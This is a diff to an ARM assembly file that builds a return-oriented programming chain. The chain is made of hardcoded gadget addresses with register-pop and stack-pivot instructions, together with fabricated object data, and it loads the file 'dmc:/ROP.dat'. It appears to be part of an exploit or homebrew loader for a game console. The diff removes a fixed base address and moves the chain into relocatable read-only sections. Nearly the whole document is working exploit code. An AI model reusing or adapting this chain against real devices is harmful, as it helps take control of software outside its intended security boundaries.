@@ -1,7 +1,6 @@
 	.arm
-	.text
+	.section .rodata.rop
 
-#define SELF_LOC 0x08B88400
 #define BUFFER_LOC 0x08F01000
 #define BUFFER_SIZE 0x00004000
 
@@ -18,7 +17,7 @@ _start:
 	@ open file
 		.word 0x001946EB @ POP     {R0-R4,R7,PC}
 		.word 0x08F10000 @ R0 = this
-		.word SELF_LOC+FileName @ R1 = filename
+		.word FileName @ R1 = filename
 		.word 0x00000001 @ R2 = permission
 		.word 0xDEADBEEF @ R3, dummy
 		.word 0xDEADBEEF @ R4, dummy
@@ -63,16 +62,18 @@ _start:
 		.word 0xDEADBEEF @ R6, dummy
 		.word BUFFER_LOC-4 @ LR
 		.word 0x00130358 @ SP = LR, LDMFD   SP!, {LR,PC}
+	.section .rodata.init
 InitData:
-	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, SELF_LOC+_start+0x8C, 0, 0, 0, 0, 0
-	.word 0, 0, 0, 0, 0, 0, 0, SELF_LOC+_start, 0x001057C4, 0x001057C4, 0, 0, 0, 0, 0, 0
-	.word 0, 0, 0, 0x0010C2FC, SELF_LOC+_start+0x218, 0, 0, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0
+	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, _start+0x8C, 0, 0, 0, 0, 0
+	.word 0, 0, 0, 0, 0, 0, 0, _start, 0x001057C4, 0x001057C4, 0, 0, 0, 0, 0, 0
+	.word 0, 0, 0, 0x0010C2FC, _start+0x218, 0, 0, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0
 	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
 	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
 Self:
-	.word SELF_LOC+Self, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0x00130344, 0, 0, 0, 0, 0, 0
+	.word Self, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0x00130344, 0, 0, 0, 0, 0, 0
 	.word 0, 0, 0, 0, 0, 0, 0, 0
 
+	.section .rodata
 	.balign 16
 FileName:
 	.string16 "dmc:/ROP.dat"
